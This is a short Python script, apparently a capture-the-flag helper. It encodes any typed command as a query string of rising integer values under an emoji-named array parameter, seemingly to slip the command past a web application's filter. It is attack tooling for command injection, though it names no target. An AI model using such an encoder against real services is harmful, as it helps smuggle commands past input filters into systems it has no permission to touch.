#!/usr/bin/env python3
#coding=utf-8

cmd = input()
payload = ''
prevalue = 0
for i in cmd:
    curvalue = ord(i)
    while curvalue < prevalue:
        curvalue += 256
    prevalue = curvalue
    payload += ("&🍣[]=" + str(curvalue))

print( '?' + payload[1:])
